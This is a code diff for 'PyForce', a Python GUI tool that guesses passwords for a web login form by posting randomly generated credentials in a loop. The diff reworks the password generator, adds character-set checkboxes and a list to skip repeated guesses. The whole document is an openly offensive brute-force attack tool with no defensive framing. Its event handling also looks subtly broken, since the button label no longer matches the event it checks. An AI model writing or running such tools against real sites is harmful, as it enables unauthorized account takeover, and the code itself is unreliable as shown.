@@ -1,44 +1,44 @@
 # -*- coding: utf-8 -*-
 import requests
-from password_generator import PasswordGenerator
+import secrets
 import PySimpleGUI as sg
 
-sg.theme('DarkBlue7')
+# Change the theme
+sg.theme("DarkBlue7")
+
+# GUI
 layout = [
-    [sg.Text('URL', size=(11, 1)), sg.InputText('', size=(27, 1))],
-    [sg.Text('Username', size=(11, 1)), sg.InputText('', size=(27, 1))],
-    [sg.Text('Value (usrnm)', size=(11, 1)), sg.InputText('', size=(27, 1))],
-    [sg.Text('Value (pswrd)', size=(11, 1)), sg.InputText('', size=(27, 1))],
-    [sg.Text('Length', size=(11, 1)), sg.InputText('', size=(27, 1))],
-    [sg.Text('Param', size=(11, 1)), sg.InputText('', size=(27, 1))],
-    [sg.Submit(button_text='go')]
+    [sg.Text("URL", size=(11, 1)), sg.InputText("", size=(27, 1))],
+    [sg.Text("Username", size=(11, 1)), sg.InputText("", size=(27, 1))],
+    [sg.Text("Value (usrnm)", size=(11, 1)), sg.InputText("", size=(27, 1))],
+    [sg.Text("Value (pswrd)", size=(11, 1)), sg.InputText("", size=(27, 1))],
+    [sg.Text("Length", size=(11, 1)), sg.InputText("", size=(27, 1))],
+    [sg.Text("", size=(11, 1)), sg.Checkbox("Uppercase Letters")],
+    [sg.Text("Parameters", size=(11, 1)), sg.Checkbox("Lowercase Letters")],
+    [sg.Text("", size=(11, 1)), sg.Checkbox("Digits")],
+    [sg.Text()],
+    [sg.Text("", size=(11, 1)), sg.Submit(button_text="Brute Force!")]
 ]
-window = sg.Window('PyForce', layout)
+window = sg.Window("PyForce", layout)
 
-def gen(i, param):
-    pwo = PasswordGenerator()
-    if param == "U":
-        return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ', i)
-    elif param == "L":
-        return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz', i)
-    elif param == "D":
-        return pwo.shuffle_password('1234567890', i)
-    elif param == "LD" or "DL":
-        return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz1234567890', i)
-    elif param == "UD" or "DU":
-        return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', i)
-    elif param == "UL" or "LU":
-        return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', i)
-    else:
-        return pwo.shuffle_password("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890", i)
+# Function to generate password
+def gen(length, chars):
+    return "".join(secrets.choice(chars) for x in range(length))
 
-def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, param):
+# Function to start brute force
+def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars):
     count = 0
     status = requests.get(url)
     status.raise_for_status()
 
+    dupe = []
+
     while True:
-        pas = gen(length, param)
+        pas = gen(length, chars)
+        while pas in dupe:
+            pas = gen(length, chars)
+        dupe.append(pas)
+
         print(pas)
 
         message = [(usrnmvalue, usr), (pswrdvalue, pas)]
@@ -58,17 +58,37 @@ while True:
     event, values = window.read()
 
     if event is None:
-        print('exit')
+        print("exit")
         break
 
+    # If go button is pressed
     if event == "go":
         url = values[0]
         usr = values[1]
         usrnmvalue = values[2]
         pswrdvalue = values[3]
         length = int(values[4])
-        param = values[5]
+        param1 = values[5]
+        param2 = values[6]
+        param3 = values[7]
 
-        bruteforce(url, usr, usrnmvalue, pswrdvalue, length, param)
+        if param1:
+            param1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        else:
+            param1 = ""
+
+        if param2:
+            param2 = "abcdefghijklmnopqrstuvwxyz"
+        else:
+            param2 = ""
+
+        if param3:
+            param3 = "0123456789"
+        else:
+            param3 = ""
+
+        chars = param1 + param2 + param3
+
+        bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars)
 
 window.close()
